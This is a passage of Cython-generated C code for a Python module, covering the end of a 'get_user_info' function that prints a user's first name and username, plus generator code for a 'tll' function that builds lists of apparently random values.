      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_info, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 229, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 229, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_first_name = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_info, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 230, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__13, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 230, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_username = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_5 = PyTuple_New(6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 233, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_2 = 0;
      __pyx_t_3 = 127;
      __Pyx_INCREF(__pyx_kp_u_);
      __pyx_t_2 += 1;
      __Pyx_GIVEREF(__pyx_kp_u_);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_);
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_G6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 233, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 233, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u_s_2);
      __pyx_t_3 = (1114111 > __pyx_t_3) ? 1114111 : __pyx_t_3;
      __pyx_t_2 += 13;
      __Pyx_GIVEREF(__pyx_kp_u_s_2);
      PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_s_2);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_B6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 233, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 233, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u__14);
      __pyx_t_3 = (65535 > __pyx_t_3) ? 65535 : __pyx_t_3;
      __pyx_t_2 += 17;
      __Pyx_GIVEREF(__pyx_kp_u__14);
      PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u__14);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_first_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 233, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_t_6);
      __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_5, 6, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 233, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 233, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_v_username); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 234, __pyx_L1_error)
      if (__pyx_t_7) {

        
        __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 235, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_2 = 0;
        __pyx_t_3 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_B6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 235, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 235, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
        __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_s_3);
        __pyx_t_3 = (65535 > __pyx_t_3) ? 65535 : __pyx_t_3;
        __pyx_t_2 += 21;
        __Pyx_GIVEREF(__pyx_kp_u_s_3);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u_s_3);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 235, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
        __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 235, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 235, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        goto __pyx_L5;
      }

      
      /*else*/ {
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 237, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __pyx_L5:;

      
      goto __pyx_L4;
    }

    
    /*else*/ {
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__16, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 239, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __pyx_L4:;

    
    goto __pyx_L3;
  }

  
  /*else*/ {
    __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = 0;
    __pyx_t_3 = 127;
    __Pyx_INCREF(__pyx_kp_u__17);
    __pyx_t_2 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__17);
    PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u__17);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_red6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_3;
    __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u_s_s_2);
    __pyx_t_3 = (1114111 > __pyx_t_3) ? 1114111 : __pyx_t_3;
    __pyx_t_2 += 37;
    __Pyx_GIVEREF(__pyx_kp_u_s_s_2);
    PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_s_s_2);
    __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  }
  __pyx_L3:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.get_user_info", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_user_info);
  __Pyx_XDECREF(__pyx_v_first_name);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_11tll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_11tll = {"tll", (PyCFunction)__pyx_pw_6source_11tll, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_11tll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("tll (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_10tll(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)__pyx_tp_new_6source___pyx_scope_struct__genexpr(__pyx_ptype_6source___pyx_scope_struct__genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 404, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_2generator, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 404, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 404, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 404, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 404, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 404, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 404, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 404, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 404, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 404, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 404, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 404, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 404, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 404, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_5generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_3genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(__pyx_ptype_6source___pyx_scope_struct_1_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 405, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_5generator1, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 405, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_5generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 405, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 405, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 405, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__19, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 405, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 405, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 405, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 405, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 405, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 405, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 405, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 405, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 405, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 405, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
